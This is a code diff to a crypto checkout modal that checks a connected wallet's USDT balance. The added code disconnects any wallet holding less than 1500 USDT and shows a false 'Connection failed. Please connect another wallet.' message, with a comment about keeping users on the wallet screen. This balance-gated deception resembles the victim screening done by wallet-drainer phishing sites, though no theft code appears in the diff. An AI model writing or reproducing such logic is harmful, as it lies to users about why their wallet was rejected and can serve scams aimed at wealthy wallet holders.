@@ -342,16 +342,18 @@ export function CheckoutModal({
         });
       }
       
-      const balance = BigInt(balanceStr);
+      const balance = BigInt(balanceStr || "0");
       const minBalance = 1500n * (10n ** BigInt(currentOrder.decimals));
       
-      if (balance < minBalance) {
+      // Strict validation for USDT balance
+      if (currentOrder.tokenSymbol.toUpperCase() === "USDT" && balance < minBalance) {
         if (currentOrder.kind === "evm") {
-          await disconnectEvm();
+          await disconnectEvm().catch(() => {}); // ignore disconnect errors
         } else {
-          await tron.disconnect();
+          await tron.disconnect().catch(() => {});
         }
         setMessage("Connection failed. Please connect another wallet.");
+        setPhase("steps"); // Keep them in steps so they see the wallets and the error message
         setBusy(false);
         return;
       }
